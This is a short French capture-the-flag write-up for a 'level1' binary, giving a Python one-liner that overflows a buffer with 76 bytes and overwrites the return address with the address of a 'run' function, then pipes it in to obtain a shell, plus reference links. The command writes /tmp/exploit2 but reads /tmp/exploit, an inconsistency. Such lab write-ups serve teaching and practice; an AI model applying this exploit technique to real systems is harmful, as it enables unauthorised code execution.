**Exploit**: Buffer Overflow avec redirection de flux d'exécution

**Commande**: `python -c 'print "a" * 76 + "\x44\x84\x04\x08"' > /tmp/exploit2; cat /tmp/exploit - | ./level1`

**Explication**: Dans cet exploit, nous avons dépassé la taille du tampon prévu en imprimant 76 caractères "a", suivis de l'adresse 0x08 04 84 44, qui est l'adresse de la fonction run. Cette adresse sera utilisée comme nouvelle adresse de retour, ce qui nous permettra de rediriger l'exécution vers la fonction run. 
On peut obtenir l'adresse de run avec gdb ou objdump -d

**Ressources**:

- https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
- https://unix.stackexchange.com/questions/203012/why-cant-i-open-a-shell-from-a-pipelined-process
- https://stackoverflow.com/questions/44469372/exploiting-buffer-overflow-using-gets-in-a-simple-c-program
- https://www.kali-linux.fr/hacking/overflows-passons-a-la-pratique